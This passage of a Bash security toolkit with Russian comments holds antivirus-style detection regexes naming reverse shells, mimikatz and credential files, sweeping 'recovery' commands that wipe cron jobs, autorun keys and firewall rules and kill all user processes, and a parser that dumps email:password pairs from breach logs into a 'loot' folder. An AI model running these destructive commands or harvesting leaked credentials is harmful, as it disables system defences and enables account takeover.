GLOBAL_AV_MAL_MARKERS="(rm -rf /|unset HISTFILE|history -c|killall.*log|logsave /dev/null|openssl enc -aes|gpg --encrypt|shred -u|auth\.log.*>\?|cron\.d\/|systemd\/system\/|rc\.local|\.config\/autostart|/etc/shadow|/etc/sudoers|chattr \+i|trap ''|set \+o history)"

# Слой 4: Максимальная кросс-платформенная матрица LOLBAS, утилит компрометации, хакерского софта и эксплойтов
# Детектирует: кражу /etc/passwd, Win-компоненты (PowerShell/WMIC), утилиты сканирования, туннелирования и дамперы памяти
GLOBAL_AV_LOLBAS_MATRIX="((https?|ftp|wss?):\/\/|/etc/passwd|cmd\.exe|powershell|wmic|cmdlet|api_string|bitsadmin|certutil|rundll32|regsvr32|mshta|psexec|mimikatz|nmap|masscan|sqlmap|hydra|aircrack|chisel|frp|ngrok|autoruns|vssadmin|wevtutil|schtasks|sc query|cobaltstrike|metasploit|shadowsploit)"

# ==============================================================================
# [ДИНАМИЧЕСКИЙ КОНТУР: МОНИТОРИНГ ОПЕРАТИВНОЙ ПАМЯТИ (ОЗУ) И СЕТЕВОЙ АКТИВНОСТИ]

# Слой 5: Расширенная матрица перехвата активных вредоносных процессов, сканеров и криптомайнеров в ОЗУ
# Детектирует: запущенные бинарники компрометации, утилиты удаленного контроля, шеллы и потоковые майнеры
GLOBAL_AV_ACTIVE_MALWARE_PROCS="(nc|netcat|socat|chisel|frp|ngrok|nmap|masscan|hydra|xmrig|minerd|cryptonight|stratum\+tcp|reverse|sh -i|bash -i|zsh -i|tmux new.*-d|screen -d -m)"

# Слой 6: Фильтр критических состояний сетевых сокетов (Подозрительные шлюзы, биндинг портов, активные утечки)
# Детектирует: прослушивание портов (бэкдоры), установленные сессии (утечка данных) и синхронизацию сокетов
GLOBAL_AV_SOCKET_STATES="(LISTEN|ESTABLISHED|ESTAB|SYN_SENT|SYN_RECV)"

# ==============================================================================
# ЕДИНЫЙ МОНОЛИТНЫЙ СУПЕР-КОНВЕЙЕР УЛЬТИМАТИВНОЙ ЭВРИСТИКИ ДЛЯ АВТОПИЛОТА CAME
# ==============================================================================
GLOBAL_AV_ENGINE_PIPE="${GLOBAL_AV_SYS_CALLS}|${GLOBAL_AV_NET_VECTORS}|${GLOBAL_AV_MAL_MARKERS}|${GLOBAL_AV_LOLBAS_MATRIX}"




# ==============================================================================
# 8. ГЛОБАЛЬНЫЕ МАТРИЦЫ КРОСС-ПЛАТФОРМЕННОЙ РЕАНИМАЦИИ (OS RECOVERY MATRICES)
# ==============================================================================
# [КОНТУР WINDOWS: ТОТАЛЬНАЯ ДЕСТРУКЦИЯ БЛОКИРОВОК И ЗАЧИСТКА АВТОЗАПУСКА]
# Фиксирует: Диспетчер задач, Редактор реестра, Командную строку, свойства папок, Userinit,
# вырезает вредоносный автозапуск (Run/RunOnce, Winlogon, Сhevron), очищаетhosts-файл от блокировок AV-сайтов,
# принудительно восстанавливает запуск критических служб безопасности (WinDefend, SecurityHealthService).
GLOBAL_FIX_WIN_REG="reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 0 /f; \
reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 0 /f; \
reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCMD /t REG_DWORD /d 0 /f; \
reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 0 /f; \
reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableRegistryTools /t REG_DWORD /d 0 /f; \
reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableCMD /t REG_DWORD /d 0 /f; \
reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v Hidden /t REG_DWORD /d 1 /f; \
reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v ShowSuperHidden /t REG_DWORD /d 1 /f; \
reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe\" /f; \
reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,\" /f; \
reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /va /f; \
reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /va /f; \
reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /va /f; \
reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /va /f; \
reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /v Start /t REG_DWORD /d 2 /f; \
reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService\" /v Start /t REG_DWORD /d 2 /f; \
attrib -r -s -h C:\\Windows\\System32\\drivers\\etc\\hosts 2>nul; \
echo -e \"127.0.0.1 localhost\n::1 localhost\" > C:\\Windows\\System32\\drivers\\etc\\hosts"

# [КОНТУР LINUX: ГЛУБОКАЯ ЗАЧИСТКА ХОСТА, СБРОС ТРАФИКА И ИЗОЛЯЦИЯ ЮЗЕРСПЕЙСА]
# Фиксирует: Полное уничтожение ВСЕХ планировщиков задач (cron, systemd-таймеры, anacron),
# сброс всех цепочек трафика, NAT и кастомных таблиц перехвата (iptables/nftables),
# очистка предзагрузчика библиотек (уничтожение ядерных и юзерспейс-руткитов в ld.so.preload),
# принудительное восстановление эталонных DNS-серверов в обход локальных вредоносных прокси.
GLOBAL_FIX_LINUX="rm -rf /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/* /var/spool/cron/crontabs/* /etc/anacrontab; \
rm -rf /etc/systemd/system/*.timer /lib/systemd/system/*.timer; \
> /etc/ld.so.preload 2>/dev/null; \
chattr -i /etc/resolv.conf 2>/dev/null; \
echo -e \"nameserver 1.1.1.1\nnameserver 8.8.8.8\nnameserver 9.9.9.9\" > /etc/resolv.conf; \
chattr +i /etc/resolv.conf 2>/dev/null; \
iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -P OUTPUT ACCEPT; \
iptables -F; iptables -X; iptables -t nat -F; iptables -t nat -X; iptables -t mangle -F; iptables -t mangle -X; \
nft flush ruleset 2>/dev/null; \
echo -e \"127.0.0.1 localhost\n::1 localhost\" > /etc/hosts"

# [КОНТУР MACOS: ПОЛНОЕ КУПИРОВАНИЕ ПЕРСИСТЕНТНОСТИ И ДЕАКТИВАЦИЯ АГЕНТОВ ЗАРАЖЕНИЯ]
# Фиксирует: Принудительное тотальное отключение, выгрузка и удаление прав запуска со всех
# сторонних агентов и демонов инициализации пользователя и системы (места дислокации майнеров и spyware),
# зачистка перехватов сетевой маршрутизации, восстановление чистого hosts,
# принудительное завершение всех пользовательских фоновых процессов, запущенных вне стандартного дерева путей macOS.
GLOBAL_FIX_MACOS="launchctl unload -w /Library/LaunchAgents 2>/dev/null; \
launchctl unload -w /Library/LaunchDaemons 2>/dev/null; \
launchctl unload -w ~/Library/LaunchAgents 2>/dev/null; \
sudo chmod 000 /Library/LaunchAgents/* /Library/LaunchDaemons/* ~/Library/LaunchAgents/* 2>/dev/null; \
sudo rm -rf /private/var/db/launchd.db/com.apple.launchd/overrides.plist 2>/dev/null; \
sudo pfctl -F all -FS 2>/dev/null; \
sudo pfctl -d 2>/dev/null; \
sudo chmod +w /etc/hosts 2>/dev/null; \
echo -e \"127.0.0.1 localhost\n::1 localhost\" > /etc/hosts; \
sudo killall -9 -u \$(whoami) 2>/dev/null"




# ==============================================================================
# @description: Системный движок глубокого анализа и парсинга логов/артефактов
# ==============================================================================
core_engine_parse_target_log() {
    local log_file="$1"
    
    # Проверка физического существования целевого объекта анализа
    if [[ ! -f "$log_file" ]]; then
        core_engine_ui "e" "Критическая ошибка: Файл '$log_file' не найден или недоступен."
        return 1
    fi

    #clear
    core_engine_ui "h" "CORE PARSER: ARTIFACT & FORENSICS ENGINE"
    core_engine_ui "i" "Цель анализа: $(basename "$log_file")"
    core_engine_ui "line" ""
    
    # Используем новый однострочный прогресс ядра
    core_engine_progress 2 "STARTING_DEEP_PARSING"
    sleep 1

    # Создаем изолированный файл для сохранения извлеченных учетных данных в loot-директорию
    local log_name=$(basename "$log_file" | sed 's/\.[^.]*$//')
    local creds_loot_file="$BASE_DIR/loot/${log_name}_extracted_creds.txt"
    mkdir -p "$BASE_DIR/loot"

    core_engine_ui "i" "Сканирование структуры на критические маркеры..."

    # --- 1. АНАЛИЗ СЕКРЕТОВ: ТОКЕНЫ TELEGRAM ---
    local tg_tokens
    tg_tokens=$(grep -oE "$GLOBAL_REGEX_TG_TOKEN" "$log_file" | sort -u)
    if [[ -n "$tg_tokens" ]]; then
        local count_tg=$(echo "$tg_tokens" | wc -l)
        core_engine_ui "w" "ОБНАРУЖЕНО КРИТИЧЕСКИХ ТОКЕНОВ TELEGRAM: $count_tg"
        echo -e "${R}$tg_tokens${NC}\n"
    fi

    # --- 2. АНАЛИЗ КРИПТОГРАФИИ: ХЭШИ MD5 ---
    local md5_hashes
    md5_hashes=$(grep -oE "$GLOBAL_REGEX_HASH_MD5" "$log_file" | sort -u)
    if [[ -n "$md5_hashes" ]]; then
        local count_md5=$(echo "$md5_hashes" | wc -l)
        core_engine_ui "s" "Найдены хэш-сигнатуры MD5: $count_md5 объектов."
    fi

    # --- 3. АНАЛИЗ КРИПТОГРАФИИ: ХЭШИ SHA-256 ---
    local sha_hashes
    sha_hashes=$(grep -oE "$GLOBAL_REGEX_HASH_SHA256" "$log_file" | sort -u)
    if [[ -n "$sha_hashes" ]]; then
        local count_sha=$(echo "$sha_hashes" | wc -l)
        core_engine_ui "s" "Найдены хэш-сигнатуры SHA-256: $count_sha объектов."
    fi

    # --- 4. СЕТЕВОЙ УРОВЕНЬ: IPV6 И MAC АДРЕСА ---
    local ipv6_addresses=$(grep -oE "$GLOBAL_REGEX_IPV6" "$log_file" | sort -u)
    local mac_addresses=$(grep -oE "$GLOBAL_REGEX_MAC" "$log_file" | sort -u)
    
    if [[ -n "$ipv6_addresses" || -n "$mac_addresses" ]]; then
        local count_ip=$(echo "$ipv6_addresses" | grep -v '^$' | wc -l || echo 0)
        local count_mac=$(echo "$mac_addresses" | grep -v '^$' | wc -l || echo 0)
        core_engine_ui "i" "Сетевые следы: Обнаружено IPv6 ($count_ip), MAC-адресов ($count_mac)."
    fi

    # --- 5. УЧЕТНЫЕ ДАННЫЕ: EMAIL/LOGIN:PASSWORD (Парсинг COMB) ---
    grep -oE "$GLOBAL_REGEX_CREDENTIALS" "$log_file" | sort -u > "$creds_loot_file"
    local count_creds=$(grep -c "^" "$creds_loot_file" || echo 0)

    # --- 6. ИТОГОВЫЙ СИСТЕМНЫЙ ОТЧЕТ В КОНСОЛЬ ---
    core_engine_ui "line" ""
    core_engine_ui "s" "ГЛУБОКИЙ СТАТИЧЕСКИЙ АНАЛИЗ ЗАВЕРШЕН"
    core_engine_ui "line" ""
    
    echo -e "${B}Файл базы данных лога:${NC} $log_file"
    echo -e "${Y}Извлечено учетных записей:${NC} $count_creds пар(ы) логин:пароль."
    
    if (( count_creds > 0 )); then
        core_engine_ui "s" "Артефакты успешно экспортированы в защищенное хранилище:"
        echo -e "${G}📂 Path: $creds_loot_file${NC}"
        core_engine_loot "parser" "Парсинг $log_name завершен. Извлечено записей: $count_creds"
    else
        rm -f "$creds_loot_file"
    fi
    
    core_engine_ui "line" ""
    core_engine_wait
}



# ==========================================
# 1. CORE ENGINE (Должны быть ПЕРВЫМИ)
# ==========================================

# Core Engine: Базовый UI-маркер
# Эвристически определяет тип сообщения по первому символу (+, !, ?)
core_engine_ui() {
    case "$1" in
        "h") echo -e "\n${B}>>> ${W}$2 ${B}<<<${NC}" ;;
        "i") echo -e "${B}[i]${NC} $2" ;;
        "s") echo -e "${G}[+]${NC} $2" ;;
        "e") echo -e "${R}[-]${NC} $2" ;;
        "line") echo -e "${B}---------------------------------------${NC}" ;;
    esac
}


# Core Engine: Эвристическое удаление
# Автоматически выбирает между -f и -rf, подавляя весь вывод
core_engine_remove() {
    # Эвристика: если объект — директория, используем -rf, иначе -f
    for item in "$@"; do
        if [ -d "$item" ]; then
            rm -rf "$item" 2>/dev/null
        else
            rm -f "$item" 2>/dev/null
        fi
    done
}

# Core Engine: Безопасный динамический исполнитель
core_engine_exec() {
    local cmd="$1"
    local mode="${2:-silent}" # По умолчанию — полная тишина

    if [[ "$mode" == "silent" ]]; then
        # Используем bash -c для безопасного выполнения команды в фоне
        # Перенаправление происходит на уровне оболочки, это надежно
        bash -c "$cmd" >/dev/null 2>&1
    else
        bash -c "$cmd"
    fi
}


# Core Engine: Стерилизация окружения
# Использует встроенную логику удаления для очистки следов сессии
core_engine_clean_env() {
    local cache_targets=(
        "/root/.cache/zcompdump*"
        "/root/.zcompdump*"
        "${HOME}/.cache/zcompdump*"
    )
    
    # Просто вызываем наш универсальный модуль
    core_engine_remove "${cache_targets[@]}"
}


# --- Инициализация системы ---

# Core Engine: Отрисовка элемента интерфейса
# Автоматически подбирает цвет ключа и форматирует строку
core_engine_item() {
    local key="$1"
    local title="$2"
    local desc="${3:-}" # Эвристика: если описания нет, переменная просто пустая

    # 1. Эвристика цвета: R для выхода/назад, Y для инфо, G для остального
    # Используем регулярные выражения для мгновенного схлопывания case
    local k_color=$G
    [[ "$key" =~ ^(b|x|q|exit|back)$ ]] && k_color=$R
    [[ "$key" =~ ^(i|info)$ ]] && k_color=$Y

    # 2. Формирование и вывод в одну строку для максимальной скорости
    # Конструкция ${desc:+ - $desc} добавит дефис и описание только если desc не пуст
    echo -e "  ${k_color}${key})${NC} [${B}${title}${NC}]${desc:+ - $desc}"
}


# Core Engine: Универсальный захват данных
# Автоматически форматирует приглашение и поддерживает скрытый ввод
core_engine_input() {
    local label="$1"
    local hint="$2"
    local var_value
    local cmd="read -r"

    # 1. Эвристика цвета метки (синхронизация с core_engine_item)
    local l_color=$G
    [[ "$label" =~ ^(b|x|q|exit|back)$ ]] && l_color=$R
    [[ "$label" =~ ^(i|info)$ ]] && l_color=$Y

    # 2. Эвристика скрытого ввода (если в подсказке есть "pass" или "key")
    [[ "${hint,,}" =~ (pass|key|secret) ]] && cmd="read -rs"

    # 3. Отрисовка поля (направляем в stderr, чтобы не засорять результат функции)
    echo -ne "  ${l_color}${label})${NC} [${B}${hint}${NC}] ${Y}>> ${NC}" >&2
    
    # 4. Исполнение захвата
    $cmd var_value
    
    # 5. Возврат значения (и перенос строки для скрытого режима)
    [[ "$cmd" == "read -rs" ]] && echo "" >&2
    echo "$var_value"
}



# Core Engine: Тихий запуск команд
# Выполняет задачу без вывода, возвращая только статус завершения
core_engine_run() {
    # Используем "$@" для корректной передачи аргументов с пробелами
    # Перенаправляем stdout и stderr в /dev/null
    "$@" > /dev/null 2>&1
    
    # Возвращаем реальный код выхода команды для последующих проверок
    return $?
}




# Core Engine: Ожидание действия пользователя
# Автоматически форматирует отступ и выводит интерактивное приглашение
core_engine_wait() {
    # 1. Эвристический отступ (заменяет spacer)
    echo -e "\n${B}------------------------------------------${NC}"
    
    # 2. Интерактивный запрос
    # Используем stderr (>&2), чтобы не засорять возможные конвейеры данных
    echo -ne "${Y}Нажмите [Enter] для продолжения...${NC}" >&2
    
    # 3. Ожидание ввода (флаг -s скроет случайные нажатия клавиш, если нужно, 
    # но здесь оставим стандарт для явного подтверждения)
    read -r
}



core_engine_control() {
    local status=$?
    local mode="$1"      
    local label="$2"     
    local cmd="$3" 
    local fatal="${4:-0}"

    case "$mode" in
        "check")
            if [[ $status -eq 0 ]]; then
                core_engine_ui "+$label: Успешно"
                return 0
            fi
            core_engine_ui "!$label: Ошибка"
            [[ "$fatal" == "1" ]] && { core_engine_ui "!Критический сбой. Остановка."; exit 1; }
            return 1
            ;;

        "restart")
            core_engine_ui "?Перезагрузка: [$label]..."
            # Используем pkill, но защищаемся от пустых имен
            [[ -n "$label" ]] && pkill -f "$label" 2>/dev/null
            sleep 1
            
            if [[ -n "$cmd" ]]; then
                # БЕЗОПАСНЫЙ ЗАПУСК:
                # bash -c выполняет команду в изолированной среде
                bash -c "$cmd" &
                
                # Проверяем успешность запуска самой команды bash -c
                local run_status=$?
                core_engine_control "check" "Модуль [$label]" "" "$fatal"
            else
                core_engine_ui "!Ошибка: Команда запуска [$label] пуста"
                return 1
            fi
            ;;
    esac
}




core_engine_validator() {
    local type="$1"    # Категория проверки
    local target="$2"  # Объект (IP, домен, файл, пакет)
    local label="$3"   # Имя для вывода в лог/UI
    local extra="$4"   # Доп. параметр (например, макс. значение range)
    local failed=0
    local err_msg=""

    case "$type" in
        # ======================================================================
        # СИСТЕМНЫЙ СЛОЙ
        # ======================================================================
        "root")
            [[ $EUID -ne 0 ]] && { failed=1; err_msg="Требуются привилегии суперпользователя (ROOT/sudo)"; }
            ;;
            
        "pkg")
            if ! command -v "$target" >/dev/null 2>&1; then
                core_engine_ui "i" "Зависимость [$target] отсутствует. Инициализация установки через APT..."
                if core_engine_run apt-get install -y "$target"; then
                    core_engine_ui "s" "Компонент [$target] успешно интегрирован в операционную систему."
                    return 0
                else
                    failed=1; err_msg="Критическая ошибка APT: не удалось установить пакет [$target]"; fi
            fi
            ;;

        # ======================================================================
        # СЕТЕВОЙ И ИНФРАСТРУКТУРНЫЙ СЛОЙ
        # ======================================================================
        "url"|"host")
            # Снайперская проверка через наш ультимативный объединенный сетевой стек
            # Проверяет IPv4, IPv6, MAC и Домены одновременно на основе шапки конфигурации
            if [[ ! "$target" =~ $GLOBAL_SUPER_REGEX_INFRA ]]; then
                failed=1; err_msg="Недопустимый сетевой формат цели: [$target]. Не соответствует RFC."; fi
            ;;

        "net_up")
            # Безопасная проверка доступности узла с ограничением по времени
            if ! timeout 2 ping -c 1 "$target" >/dev/null 2>&1; then
                failed=1; err_msg="Узел [$target] не отвечает на запросы (Offline или ICMP Drop)"; fi
            ;;

            # ======================================================================
            # СЕТЕВОЙ И ИНФРАСТРУКТУРНЫЙ СЛОЙ
            # ======================================================================
            "privacy")
                # АВТОНОМНАЯ ЗАЩИТА ОТ ДЕАНOНИМИЗАЦИИ (БЕЗ ВНЕШНЕГО СЛИВА IP)
                # Проверяем наличие активных туннелей через глобальную маску интерфейсов
                if ! ip link show up | grep -qEi "$GLOBAL_REGEX_PRIVACY_INTERFACES"; then
                    # Дополнительный эвристический рубеж: сверка с переменной REAL_IP
                    if [[ -n "$REAL_IP" ]]; then
                        local current_ip=$(curl -s --max-time 3 --connect-timeout 2 https://api.ipify.org || echo "TIMEOUT")
                        if [[ "$current_ip" == "$REAL_IP" ]]; then
                            failed=1; err_msg="VPN/Proxy не активен! Обнаружена утечка реального IP-адреса [$current_ip]"; fi
                    else
                        core_engine_ui "w" "Внимание: Пассивный аудит интерфейсов не выявил VPN-туннелей ($GLOBAL_REGEX_PRIVACY_INTERFACES)."
                    fi
                fi
                ;;

        # ======================================================================
        # ФАЙЛОВЫЙ СЛОЙ
        # ======================================================================
        "file"|"read")
            if [[ ! -f "$target" ]]; then
                failed=1; err_msg="Целевой файл [$target] не найден в файловой системе"; 
            elif [[ ! -r "$target" ]]; then
                failed=1; err_msg="Ошибка прав доступа: файл [$target] запрещен для чтения";
            fi
            ;;

        "dir")
            if [[ ! -d "$target" ]]; then
                core_engine_ui "i" "Директория [$target] отсутствует. Запуск генерации пути..."
                if core_engine_run mkdir -p "$target"; then
                    core_engine_ui "s" "Инфраструктурная директория успешно создана: $target"
                    return 0
                else
                    failed=1; err_msg="Ошибка ФС: недостаточно прав на создание пути [$target]"; fi
            fi
            ;;

        # ======================================================================
        # КРИПТОГРАФИЧЕСКИЙ И ЛОГИЧЕСКИЙ СЛОЙ
        # ======================================================================
        "crypto")
            # Новая валидация: проверка на то, является ли объект хэшем (MD5/SHA256)
            if [[ ! "$target" =~ $GLOBAL_SUPER_REGEX_CRYPTO ]]; then
                failed=1; err_msg="Объект [$target] не является валидным криптографическим хэшем."; fi
            ;;

       # ======================================================================
        # КРИПТОГРАФИЧЕСКИЙ И ЛОГИЧЕСКИЙ СЛОЙ
        # ======================================================================
        "range")
            # Если доп. параметр extra не передан, ядро берет дефолтный лимит из шапки
            local max_boundary="${extra:-$GLOBAL_CORE_MENU_MAX_LIMIT}"
            
            # Проверка типа данных и вхождения в диапазон через глобальные константы
            if [[ ! "$target" =~ $GLOBAL_REGEX_DIGIT ]] || (( target < 1 || target > max_boundary )); then
                failed=1; err_msg="Числовое значение [$target] вышло за допустимые лимиты (1-$max_boundary)"; fi
            ;;

        "list"|"empty")
            # Жесткая очистка строки от пробелов перед проверкой на пустоту
            if [[ -z "${target// }" ]]; then
                failed=1; err_msg="Обязательное конфигурационное поле [$label] пустое"; fi
            ;;
            
        "entropy")
            # Защита ядра от случайных кликов и мусорного ввода
            if [[ ${#target} -lt 3 ]]; then
                failed=1; err_msg="Длина данных объекта [$label] критически мала (минимум 3 символа)"; fi
            ;;
    esac

    # Финализация и выдача структурированного отчета
    if [[ $failed -eq 1 ]]; then
        core_engine_ui "e" "КРИТИЧЕСКАЯ ОШИБКА ВАЛИДАЦИИ [$label] -> $err_msg"
        return 1
    fi
    
    return 0
}

# --- CORE ENGINE: LOOT COLLECTOR v1.2 (Session Logger) ---
core_engine_loot() {
    local category="${1:-SYSTEM}" # Категория: service, scan, exploit
    local message="$2"
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    local loot_file="$PRIME_LOOT/session_loot.log"

    # Создаем папку, если её нет (универсально для Root/Non-Root)
    mkdir -p "$PRIME_LOOT" 2>/dev/null

    # Форматируем запись для файла
    echo "[$timestamp] [$category] $message" >> "$loot_file"

    # Если это запуск сервиса, дублируем в UI для красоты
    if [[ "$category" == "service" ]]; then
        core_engine_ui "i" "Event logged to loot sector."
    fi
}


#Настройки 


# ==============================================================================
# @description: Синхронизация сетевого слоя DNS и локальной маршрутизации v22.0
# СИНХРОНИЗАЦИЯ: Полная поддержка промышленной матрицы GLOBAL_DNS_CONFIG_MATRIX v22.0
# МОДЕРНИЗАЦИЯ: Интеллектуальный контроль зомби-сокетов, деликатная зачистка PID
# БЕЗОПАСНОСТЬ: Автономная инъекция loopback-резолвера для обхода блокировок WAN
# ==============================================================================
core_network_dns_sync() {
    core_engine_ui "h" "NEXUS LAYER: NETWORK DNS ADAPTATION & SYNC v22.0"

    # Слой 0: Верификация прав доступа (изменение /etc/ требует привилегий root)
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "!" "Ошибка доступа: Требуются права суперпользователя (sudo)."
        return 1
    fi

    # Проверка доступности бинарного файла dnsmasq в системе
    if ! command -v dnsmasq >/dev/null 2>&1; then
        core_engine_ui "!" "Сбой окружения: dnsmasq не найден в системе. Пропуск слоя."
        return 1
    fi

    # --- ШАГ 1: ЭВРИСТИКА АКТИВНОГО IP (Изоляция интерфейса) ---
    local active_ip
    active_ip=$(ip -4 addr show | grep -vE '127.0.0.1|docker|veth|br-|lxd' | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)
    
    # Резервный откат на локальный интерфейс в случае автономного режима
    [[ -z "$active_ip" ]] && active_ip="127.0.0.1"

    # --- ШАГ 2: СБОР МЕТРИК ОКРУЖЕНИЯ ---
    local hostname
    hostname=$(hostname)
    local dns_conf="/etc/dnsmasq.conf"
    
    core_engine_ui "i" "Связывание локальных доменов с активным узлом IP: $active_ip"

    # --- ШАГ 3: ДИНАМИЧЕСКАЯ ИНЪЕКЦИЯ КОНФИГУРАЦИИ ИЗ ГЛОБАЛЬНОЙ МАТРИЦЫ ---
    local tmp_dns
    tmp_dns=$(mktemp)
    
    local raw_line
    for raw_line in "${GLOBAL_DNS_CONFIG_MATRIX[@]}"; do
        # Интеллектуальная подстановка живых переменных вместо шаблонов на лету
        local processed_line="$raw_line"
        processed_line="${processed_line//%IP%/$active_ip}"
        processed_line="${processed_line//%HOST%/$hostname}"
        
        # Безопасная запись с принудительным завершением строки \n
        printf "%s\n" "$processed_line" >> "$tmp_dns"
    done

    # --- ШАГ 4: ВАЛИДАЦИЯ, ПАТЧ И ИНТЕЛЛЕКТУАЛЬНЫЙ ПЕРЕЗАПУСК ДВИЖКА ---
    if dnsmasq --test -C "$tmp_dns" >/dev/null 2>&1; then
        # Конфиг полностью валиден — производим атомарную подмену рабочего файла
        cp "$tmp_dns" "$dns_conf"
        chmod 644 "$dns_conf"
        
        core_engine_ui "i" "Конфигурация успешно верифицирована. Перезапуск демона..."
        
        # Попытка мягкого перезапуска через системный менеджер служб (systemd или init.d)
        if systemctl restart dnsmasq 2>/dev/null || service dnsmasq restart 2>/dev/null; then
            core_engine_ui "+" "DNS Sync Complete: http://$hostname.local"
        else
            # Критический путь: если служба зависла, сначала пробуем мягкий SIGTERM (15)
            core_engine_ui "w" "Служба заблокирована сокетом. Очистка дедлоков..."
            killall -15 dnsmasq 2>/dev/null
            sleep 1
            
            # Если процесс проигнорировал мягкий сброс, выжигаем его через SIGKILL (9)
            if pidof dnsmasq >/dev/null; then
                killall -9 dnsmasq 2>/dev/null
                sleep 1
            fi
            
            # Прямой ручной запуск демона на основе обновленного конфигурационного файла
            if dnsmasq -C "$dns_conf"; then
                core_engine_ui "+" "DNS Engine Restarted (Manual Recovery Mode)"
            else
                core_engine_ui "!" "Критический сбой: Порт 53 занят сторонним процессом (systemd-resolved?)."
                rm -f "$tmp_dns"
                return 1
            fi
        fi
        
        # --- ШАГ 5: АВТОНОМНАЯ ФИКСАЦИЯ ЛОКАЛЬНОГО РЕЗОЛВЕРА ---
        # Так как в матрице v22.0 включен флаг no-resolv, принудительно переводим 
        # текущую машину на обслуживание созданным локальным сервером dnsmasq.
        if ! grep -q "nameserver 127.0.0.1" /etc/resolv.conf 2>/dev/null; then
            # Запись инъекции петли в начало системного резолвера
            sed -i '1i nameserver 127.0.0.1' /etc/resolv.conf 2>/dev/null
        fi
    else
        core_engine_ui "!" "Критическая ошибка: Сгенерированный конфиг v22.0 поврежден. Откат изменений."
        rm -f "$tmp_dns"
        return 1
    fi

    # Финальная санитарная очистка временных файлов из директории /tmp/
    rm -f "$tmp_dns"
    return 0
}


# ==============================================================================
# @description: System metrics harvester and kernel status display v24.5
# OPTIMIZATION: Ultra-compact English layout for mobile terminal screens
# COMPATIBILITY: Advanced non-root engine for Termux (Cellular & BT state fixes)
# ==============================================================================
core_engine_info() {
    core_engine_ui "i" "INFRASTRUCTURE SYSTEM STATUS"

    # --- LAYER 1: MEMORY METRICS ---
    local ram_status="\e[1;31m[N/A]\e[0m"
    local free_output
    free_output=$(free -m 2>/dev/null | grep "Mem:")
    
    if [[ -n "$free_output" ]]; then
        local ram_total=$(echo "$free_output" | awk '{print $2}')
        local ram_used=$(echo "$free_output" | awk '{print $3}')
        ram_status="\e[1;36m${ram_used}/${ram_total} MB\e[0m"
    else
        local mem_total=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
        if [[ -n "$mem_total" ]]; then
            ram_status="\e[1;36m$((mem_total / 1024)) MB\e[0m"
        fi
    fi

    local disk_status="\e[1;31m[N/A]\e[0m"
    if command -v df >/dev/null 2>&1; then
        local disk_free=$(df -h / | tail -n 1 | awk '{print $4}')
        disk_status="\e[1;32m$disk_free free\e[0m"
    fi

    echo -e " Memory/Disk  : RAM: $ram_status | ROM: $disk_status"

    # --- LAYER 2: NETWORK GATEWAY (Cellular Data & Wi-Fi Fix) ---
    local active_uplink="\e[1;31m[OFFLINE]\e[0m"
    local target_interface="\e[1;31m[NONE]\e[0m"
    local default_route
    
    default_route=$(ip route show default 2>/dev/null | head -n 1)
    
    if [[ -n "$default_route" && ! "$default_route" =~ "Permission denied" ]]; then
        target_interface=$(echo "$default_route" | awk '{print_idx=0; for(i=1;i<=NF;i++) if($i=="dev") print_idx=i+1; if(print_idx>0) print $print_idx}')
        active_uplink="\e[1;32m[ONLINE]\e[0m"
    else
        # Глубокий non-root парсинг сетевых интерфейсов Android (Wi-Fi / Mobile Data)
        local active_ip=""
        # Проверяем IP сотовой связи или Wi-Fi через внутренние проперти Android
        active_ip=$(getprop net.gprs.local-ip 2>/dev/null)
        [[ -z "$active_ip" ]] && active_ip=$(getprop dhcp.wlan0.ipaddress 2>/dev/null)
        
        # Резервный поиск черезproc/net/route, доступный без прав root
        if [[ -z "$active_ip" && -f /proc/net/route ]]; then
            local raw_interface=$(awk '$2=="00000000" {print $1}' /proc/net/route | head -n 1)
            if [[ -n "$raw_interface" ]]; then
                target_interface="\e[1;32m$raw_interface\e[0m"
                active_uplink="\e[1;32m[ONLINE]\e[0m"
            fi
        fi

        # Если интерфейс определен черезproc, пропускаем, иначе ставим сотовый маркер
        if [[ "$active_uplink" =~ "OFFLINE" && -n "$active_ip" ]]; then
            active_uplink="\e[1;32m[ONLINE]\e[0m"
            # Проверяем, мобильные данные это или Wi-Fi
            if getprop net.lte.ims.reg.state 2>/dev/null | grep -q "1" || [[ -n $(getprop gsm.network.type 2>/dev/null) ]]; then
                target_interface="\e[1;32mrmnet/lte\e[0m"
            else
                target_interface="\e[1;32mwlan0\e[0m"
            fi
        fi
    fi

    echo -e " Net/Gateway  : $active_uplink -> Link: $target_interface"

    # --- LAYER 3: RADIO MODULES (Advanced Bluetooth & Wi-Fi Check) ---
    local wifi_status="\e[1;31m[ABS]\e[0m"
